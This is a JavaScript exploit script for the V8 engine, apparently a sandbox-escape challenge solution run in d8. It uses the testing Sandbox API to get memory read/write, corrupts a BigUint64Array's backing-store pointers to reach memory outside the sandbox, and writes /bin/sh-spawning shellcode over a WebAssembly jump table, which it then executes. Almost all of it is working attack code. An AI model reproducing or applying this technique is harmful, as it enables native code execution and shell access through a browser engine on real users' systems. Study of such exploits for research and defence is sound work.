/* constants */

const kJumpTableStartOffset = 0x60; // offset of jump_table_start in WasmInstanceObject

const kExternalPointerOffset = 0x2c; // offset of external_pointer in JSTypedArray
const kBasePointerOffset = 0x34; // offset of base_pointer in JSTypedArray


/* helpers */

d8.file.execute("v8/test/mjsunit/wasm/wasm-module-builder.js");

// convert integer into hex string
function hex(i) { return `0x${i.toString(16)}`; }


/* implement sandboxed exploit primitives */

// get compressed address of obj
function addrof(obj) { return Sandbox.getAddressOf(obj); }

// arbitrary address read / write
function rw(addr, value = NaN) {
  let buf = new Sandbox.MemoryView(addr, 8);
  let view = new DataView(buf);

  if (Number.isNaN(value)) { // read
    return view.getBigUint64(0, true);
  } else { // write
    view.setBigUint64(0, value, true);
  }
}


/* escape v8 sandbox */

// arbitrary address read / write (unsandboxed)
function rw_full(addr, value = NaN) {
  let arr = new BigUint64Array(1);
  let arr_addr = addrof(arr);

  rw(arr_addr + kExternalPointerOffset, addr); // overwrite external_pointer
  rw(arr_addr + kBasePointerOffset, 0x0n); // overwrite base_pointer

  if (Number.isNaN(value)) { // read
    return arr[0];
  } else { // write
    arr[0] = value;
  }
}

// construct wasm module
let builder = new WasmModuleBuilder();
builder.addFunction("main", makeSig([], [])).addBody([]).exportFunc();
let instance = builder.instantiate();
let instance_addr = addrof(instance);
console.log(`[+] instance_addr == ${hex(instance_addr)}`);

// obtain address of jump table
let jump_table_start = rw(instance_addr + kJumpTableStartOffset);
console.log(`[+] jump_table_start = ${hex(jump_table_start)}`);

let shellcode = [106, 104, 72, 184, 47, 98, 105, 110, 47, 47, 47, 115, 80, 72, 137, 231, 104, 114, 105, 1, 1, 129, 52, 36, 1, 1, 1, 1, 49, 246, 86, 106, 8, 94, 72, 1, 230, 86, 72, 137, 230, 49, 210, 106, 59, 88, 15, 5]; // shellcode.py

// overwrite jump table with shellcode
while (shellcode.length % 8 != 0) { shellcode.push(0x90); }
for (let i = 0; i < shellcode.length / 8; i++) {
  let segment = 0x0n;
  for (let j = 0; j < 8; j++) { segment += BigInt(shellcode[i * 8 + j]) << BigInt(j * 8); }
  rw_full(jump_table_start + BigInt(i * 8), segment);
}

// execute shellcode
instance.exports.main();
